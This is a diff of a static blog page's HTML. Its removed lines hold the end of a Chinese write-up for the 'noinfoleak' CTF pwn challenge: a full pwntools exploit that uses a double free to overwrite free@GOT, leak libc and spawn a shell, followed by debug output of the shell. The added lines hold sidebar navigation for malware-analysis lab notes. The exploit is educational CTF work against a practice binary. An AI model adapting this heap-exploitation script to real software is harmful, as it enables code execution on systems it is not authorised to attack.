class="line"><span class="number">0x601130</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>
-
-<p>edit(1,addr)，填充index为1的arr存储的地址指向的空间为addr。</p>
-<h1 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h1><p>思路如下：</p>
-<p>首先通过double free将0x6010a0开始的一段空间作为fake chunk，这样结合edit的操作进行地址的写入比较方便。</p>
-<p>通过edit最后一个malloc的fake chunk来修改chunk1的地址，通过edit chunk1来达成任意地址修改，这里修改free的地址比较方便：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">big_small_end_convert</span><span class="params">(data)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> binascii.hexlify(binascii.unhexlify(data)[::<span class="number">-1</span>])</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">binary_name = <span class="string">'noinfoleak'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">	io = process(<span class="string">'./noinfoleak'</span>)</span><br><span class="line">	libc = ELF(<span class="string">'./libc.so.6'</span>,checksec=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	io = remote(<span class="string">'ctf1.linkedbyx.com'</span>,<span class="number">10446</span>)</span><br><span class="line">	libc = ELF(<span class="string">'./libc.so.6'</span>,checksec=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./'</span>+binary_name,checksec=<span class="literal">False</span>)</span><br><span class="line">libc=ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">z</span><span class="params">(a=<span class="string">''</span>)</span>:</span></span><br><span class="line">	gdb.attach(io,a)</span><br><span class="line">	<span class="keyword">if</span> a == <span class="string">''</span>:</span><br><span class="line">        	raw_input()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,data)</span>:</span></span><br><span class="line">	io.sendlineafter(<span class="string">"&gt;"</span>,<span class="string">"1"</span>)</span><br><span class="line">	io.sendlineafter(<span class="string">"&gt;"</span>,str(size))</span><br><span class="line">	io.sendlineafter(<span class="string">"&gt;"</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">	io.sendlineafter(<span class="string">"&gt;"</span>,<span class="string">"2"</span>)</span><br><span class="line">	io.sendlineafter(<span class="string">"&gt;"</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,data)</span>:</span></span><br><span class="line">	io.sendlineafter(<span class="string">"&gt;"</span>,<span class="string">"3"</span>)</span><br><span class="line">	io.sendlineafter(<span class="string">"&gt;"</span>,str(index))</span><br><span class="line">	io.sendafter(<span class="string">"&gt;"</span>,data) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">arr_addr=<span class="number">0x6010A0</span></span><br><span class="line">free_got=<span class="number">0x601018</span></span><br><span class="line">puts_plt=<span class="number">0x4006B0</span></span><br><span class="line">puts_got=<span class="number">0x601028</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">"/bin/sh\x00"</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">"AAAAAAAA"</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">"BBBBBBBB"</span>)<span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>,p64(arr_addr))<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">"CCCCCCCC"</span>)<span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">"DDDDDDDD"</span>)<span class="comment">#5</span></span><br><span class="line">add(<span class="number">0x20</span>,p64(free_got))<span class="comment">#6-&gt;fake chunk (1)</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,p64(puts_plt))</span><br><span class="line">edit(<span class="number">6</span>,p64(puts_got))</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">puts_addr=int(big_small_end_convert(enhex(io.recvline()[:<span class="number">-1</span>])),<span class="number">16</span>)</span><br><span class="line">libc_base=puts_addr-libc.sym[<span class="string">"puts"</span>]</span><br><span class="line">system_addr=libc_base+libc.sym[<span class="string">"system"</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"puts_addr="</span>,hex(puts_addr)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"libc_base="</span>,hex(libc_base)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"system_addr="</span>,hex(system_addr)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">6</span>,p64(free_got))</span><br><span class="line">edit(<span class="number">1</span>,p64(system_addr))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ ls</span><br><span class="line">[DEBUG] Sent 0x3 bytes:</span><br><span class="line">    <span class="string">'ls\n'</span></span><br><span class="line">[DEBUG] Received 0x4a bytes:</span><br><span class="line">    <span class="string">'core  exp1.py  exp.py  libc.so.6  noinfoleak  peda-session-noinfoleak.txt\n'</span></span><br><span class="line">core  exp1.py  exp.py  libc.so.6  noinfoleak  peda-session-noinfoleak.txt</span><br></pre></td></tr></table></figure>
-
-
-<p><a href="https://www.jianshu.com/p/c14970447ddd?tdsourcetag=s_pcqq_aiomsg" target="_blank" rel="noopener">Reference Documents</a></p>
-
-          
-        
+    <div class="post-spread">
       
     </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
   </div>
-  
-  
-  
-  </article>
-
-
-    
-  </section>
-
-  
 
 
           </div>
@@ -826,6 +502,10 @@
 
 
           
+
+  
+
+
 
         </div>
         
@@ -846,8 +526,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -902,6 +591,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Lab6-1"><span class="nav-number">1.</span> <span class="nav-text">Lab6-1</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Q1：在main函数调用的唯一子过程中发现的主要代码结构是什么？"><span class="nav-number">1.1.</span> <span class="nav-text">Q1：在main函数调用的唯一子过程中发现的主要代码结构是什么？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Q2：位于0x40105F的子过程是什么？"><span class="nav-number">1.2.</span> <span class="nav-text">Q2：位于0x40105F的子过程是什么？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Q3：这个程序的目的是什么？"><span class="nav-number">1.3.</span> <span class="nav-text">Q3：这个程序的目的是什么？</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Lab6-2"><span class="nav-number">2.</span> <span class="nav-text">Lab6-2</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Q1：main函数调用的第一个子过程执行了什么操作？"><span class="nav-number">2.1.</span> <span class="nav-text">Q1：main函数调用的第一个子过程执行了什么操作？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Q2：位于0x40117F的子过程是什么？"><span class="nav-number">2.2.</span> <span class="nav-text">Q2：位于0x40117F的子过程是什么？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Q3：被main函数调用的第二个子过程做了什么？"><span class="nav-number">2.3.</span> <span class="nav-text">Q3：被main函数调用的第二个子过程做了什么？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Q4：在这个子过程中使用了什么类型的代码结构？"><span class="nav-number">2.4.</span> <span class="nav-text">Q4：在这个子过程中使用了什么类型的代码结构？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Q5：在这个程序中有任何基于网络的特征的指示吗？"><span class="nav-number">2.5.</span> <span class="nav-text">Q5：在这个程序中有任何基于网络的特征的指示吗？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#这个恶意代码的目的是什么？"><span class="nav-number">2.6.</span> <span class="nav-text">这个恶意代码的目的是什么？</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Lab6-3"><span class="nav-number">3.</span> <span class="nav-text">Lab6-3</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Q1：比较在main函数于实验6-2的mian函数的调用。从main中调用的新的函数是什么？"><span class="nav-number">3.1.</span> <span class="nav-text">Q1：比较在main函数于实验6-2的mian函数的调用。从main中调用的新的函数是什么？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Q2：这个新的函数使用的参数是什么？"><span class="nav-number">3.2.</span> <span class="nav-text">Q2：这个新的函数使用的参数是什么？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Q3：这个函数包含的主要代码结构是什么？"><span class="nav-number">3.3.</span> <span class="nav-text">Q3：这个函数包含的主要代码结构是什么？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Q4：这个函数能够做什么？"><span class="nav-number">3.4.</span> <span class="nav-text">Q4：这个函数能够做什么？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Q5：在这个恶意代码中有什么本地特征？"><span class="nav-number">3.5.</span> <span class="nav-text">Q5：在这个恶意代码中有什么本地特征？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Q6：这个恶意代码的目的是什么？"><span class="nav-number">3.6.</span> <span class="nav-text">Q6：这个恶意代码的目的是什么？</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Lab6-4"><span class="nav-number">4.</span> <span class="nav-text">Lab6-4</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Q1：在实验6-3和6-4的main函数中的调用之间的关系的区别是什么？"><span class="nav-number">4.1.</span> <span class="nav-text">Q1：在实验6-3和6-4的main函数中的调用之间的关系的区别是什么？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Q2：什么新的代码结构已经被添加到main中？"><span class="nav-number">4.2.</span> <span class="nav-text">Q2：什么新的代码结构已经被添加到main中？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Q3：这个实验的解析HTML的函数和前面实验中的那些有什么区别？"><span class="nav-number">4.3.</span> <span class="nav-text">Q3：这个实验的解析HTML的函数和前面实验中的那些有什么区别？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Q4：这个程序会运行多久？（假设它已经连接到互联网。）"><span class="nav-number">4.4.</span> <span class="nav-text">Q4：这个程序会运行多久？（假设它已经连接到互联网。）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Q5：在这个恶意代码中有什么新的基于网络的迹象吗？"><span class="nav-number">4.5.</span> <span class="nav-text">Q5：在这个恶意代码中有什么新的基于网络的迹象吗？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Q6：这个恶意代码的目的是什么？-1"><span class="nav-number">4.6.</span> <span class="nav-text">Q6：这个恶意代码的目的是什么？</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
@@ -1042,6 +747,10 @@
 
 
   
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
 
   
 
